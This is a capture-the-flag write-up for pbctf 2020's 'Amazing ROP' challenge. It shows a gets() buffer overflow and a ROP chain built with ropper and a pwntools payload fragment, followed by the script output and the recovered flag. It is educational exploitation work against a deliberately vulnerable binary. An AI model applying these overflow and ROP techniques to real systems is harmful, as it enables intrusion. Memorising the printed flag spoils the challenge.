# Amazing ROP

**Category**: Pwn \
**Solves**: 87

## Challenge

Should be a baby ROP challenge. Just need to follow direction and get first
flag.

`nc maze.chal.perfect.blue 1`

By: theKidOfArcrania

## Solution

> Better write-up by datajerk
> [here](https://github.com/datajerk/ctf-write-ups/tree/master/pbctf2020/amazing_rop).

Running the file locally makes it segfault immediately, so I just no-op'd the
`safeguard` call and didn't think too much about it.

Then I just followed the directions in [bof.c](bof.c).
```c
// This is what you need to do to get the first flag
// void print_flag() {
//   asm volatile("mov $1, %%eax; mov $0x31337, %%edi; mov $0x1337, %%esi; int3" ::: "eax");
// }
```

After doing a bof using the `gets` call, we need to make a ROP chain like `print_flag`.
```
$ ropper
(ropper)> file bof.bin
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] File loaded.
(bof.bin/ELF/x86)> search %esi%
[INFO] Searching for gadgets: %esi%

[INFO] File: bof.bin
...
0x00001396: pop esi; pop edi; pop ebp; ret;   <-- Use this
...
```

Then we can use the convenient gadget `asm("pop %eax; int3; ret");` from
[bof.c](bof.c) to finish.

```python
payload += pwn.p32(offset + 0x1396)  # pop esi; pop edi; pop ebp; ret;
payload += pwn.p32(0x1337)  # esi
payload += pwn.p32(0x31337)  # edi
payload += pwn.p32(0)  # ebp
payload += pwn.p32(offset + 0x13ad)  # pop %eax; int3; ret
payload += pwn.p32(1)  # eax
```

Script output:
```
0xffd7e88c | 00 00 00 00 00 00 00 00 |
0xffd7e894 | 00 00 00 00 00 00 00 00 |
0xffd7e89c | 00 00 00 00 00 00 00 00 |
0xffd7e8a4 | 00 00 00 00 00 00 00 00 |
0xffd7e8ac | ff ff ff ff ff ff ff ff |
0xffd7e8b4 | ff ff ff ff ff ff ff ff |
0xffd7e8bc | ef be ad de 5c 0f 5e 56 |
0xffd7e8c4 | 5c 0f 5e 56 d8 e8 d7 ff |
0xffd7e8cc | 99 d5 5d 56 f0 e8 d7 ff |
0xffd7e8d4 | 00 00 00 00 00 00 00 00 |
Input some text:
Original ret addr: 0x565dd599


0xffd7e88c | 41 41 41 41 41 41 41 41 |
0xffd7e894 | 41 41 41 41 41 41 41 41 |
0xffd7e89c | 41 41 41 41 41 41 41 41 |
0xffd7e8a4 | 41 41 41 41 41 41 41 41 |
0xffd7e8ac | 41 41 41 41 41 41 41 41 |
0xffd7e8b4 | 41 41 41 41 41 41 41 41 |
0xffd7e8bc | 66 6c 61 67 5c 0f 5e 56 |
0xffd7e8c4 | 5c 0f 5e 56 d8 e8 d7 ff |
0xffd7e8cc | 96 d3 5d 56 37 13 00 00 |
0xffd7e8d4 | 37 13 03 00 00 00 00 00 |
You did it! Congratuations!
Returning to address: 0x565dd396
pbctf{hmm_s0mething_l00ks_off_w1th_th1s_s3tup}
Segmentation fault
[31337.1337] bof.bin[29855]: segfault at f7fc7000 ip 00000000f7fc7000 sp 00000000ffd7e8e8
[*] Closed connection to maze.chal.perfect.blue port 1
```
